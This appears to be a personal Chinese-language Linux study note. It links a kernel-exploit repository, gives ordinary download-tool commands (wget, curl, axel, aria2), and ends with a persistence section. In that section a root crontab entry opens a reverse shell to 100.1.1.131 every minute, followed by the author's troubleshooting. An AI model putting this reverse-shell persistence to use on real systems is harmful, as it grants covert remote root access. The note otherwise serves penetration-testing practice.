# Linux

[bsauce/kernel-exploit-factory: Linux kernel CVE exploit analysis report and relative debug environment. You don't need to compile Linux kernel and configure your environment anymore. --- bsauce/kernel-exploit-factory：Linux 内核 CVE 漏洞利用分析报告和相关调试环境。您不再需要编译 Linux 内核和配置您的环境。 (github.com)](https://github.com/bsauce/kernel-exploit-factory)

---

## 命令行-下载

### wget

```bash
# 直接下载 
wget http://www.sample-videos.com/video/mp4/big.mp4
# 后台下载
wget -b http://www.sample-videos.com/video/mp4/big.mp4
# 如果网络连接中断,恢复下载
wget -c http://www.sample-videos.com/video/mp4/big.mp4
# 从某个密码保护的 ftp 软件库下载文件
wget --ftp-user=<user_name> --ftp-password=<Give_password> Download-url-address
```

---

### curl

Curl 是另一种高效的下载工具，它可以用来上传或下载文件，只要使用一个简单的命令。它支持暂停和恢复下载程序包，并支持数量最多的 Web 协议，可预测下载完成还剩余多少时间，可通过进度条来显示下载进度。它是所有 Linux 发行版的内置工具。

```bash
# 直接下载
curl -o um.mp4 http://www.sample-videos.com/video/mp4/big.mp4
```

- `-o` : 提供名称，下载文件会以该名称保存
- `-O` : 文件就会以原始名称保存

---

### Axel

这是 wget 的出色替代者，是一款轻量级下载实用工具。它实际上是个加速器，因为它打开了多路 http 连接，可下载独立文件片段，因而文件下载起来更快速。

```bash
apt-get install axel
```

```bash
# 直接下载
axel http://www.sample-videos.com/video/mp4/big.mp4
```

---

### Aria2

这是一种开源命令行下载加速器，支持多个端口，你可以使用最大带宽来下载文件，是一款易于安装、易于使用的工具。

```bash
apt-get install aria2
```

```bash
# 直接下载
aria2c http://www.sample-videos.com/video/mp4/big.mp4
```

---

## 权限维持

### 计划任务

检查任务计划服务是否正常运行

```bash
service cron status
```

![image-20241112155442750](http://cdn.ayusummer233.top/DailyNotes/202411121554522.png)

---

查看当前计划任务

```bash
crontab -l
```

![image-20241112155919656](http://cdn.ayusummer233.top/DailyNotes/202411121559597.png)

---

写入计划任务

```bash
echo "*/1 * * * * bash -i >& /dev/tcp/100.1.1.131/7778 0>&1" > /var/spool/cron/crontabs/root

echo "*/1 * * * * echo 233>>/tmp/233" >> /var/spool/cron/crontabs/root
```

---

要删除这个计划任务需要编辑 `/var/spool/cron/crontabs/root`文件, 把这行删除即可

---

> 奇怪的是 log 显示运行完了, 但是收不到 shell:
>
> ![image-20241112180823702](http://cdn.ayusummer233.top/DailyNotes/202411121808685.png)
>
> ![image-20241112181122435](http://cdn.ayusummer233.top/DailyNotes/202411121939089.png)

所以我们需要修改一下方案, 不直接在计划任务中执行命令, 而是将命令写在脚本里然后计划任务执行脚本

![image-20241113144451522](http://cdn.ayusummer233.top/DailyNotes/202411131445673.png)

![image-20241113144504445](http://cdn.ayusummer233.top/DailyNotes/202411131445449.png)

![image-20241113144531353](http://cdn.ayusummer233.top/DailyNotes/202411131445018.png)

![image-20241113144539172](http://cdn.ayusummer233.top/DailyNotes/202411131445588.png)

















